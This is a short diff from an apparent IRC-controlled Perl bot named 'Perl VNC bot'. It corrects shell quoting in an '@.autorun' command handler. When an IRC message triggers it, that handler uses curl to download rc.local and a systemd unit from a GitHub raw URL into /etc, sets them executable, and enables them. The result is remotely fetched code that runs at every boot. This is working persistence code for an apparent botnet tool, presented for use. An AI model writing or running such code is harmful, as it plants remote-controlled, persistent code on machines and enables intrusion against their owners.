@@ -49,9 +49,9 @@ $irc->on(irc_privmsg => sub {
   $irc->write(notice => $noticechan => "9,1Perl VNC bot [FINAL] by independent: 12https://github.com/independentcod");
  }
  if ($msg =~ /@.autorun/) {
-  system("if [ ! -f "./rc.local" ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;");
-  system("chown $USER /etc/rc.local && chmod 755 /etc/rc.local && touch /etc/systemd/system/rc-local.service");
-  system("if [ ! -f "./rc-local.service" ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;");
+  system("if [ ! -f ./rc.local ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;");
+  system("chown $USER /etc/rc.local && chmod 755 /etc/rc.local && touch /etc/systemd/system/rc-local.service;");
+  system("if [ ! -f ./rc-local.service ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;");
   system("systemctl enable rc-local;");
   $irc->write(notice => $noticechan => "[info] Autorun enabled\n");
  }
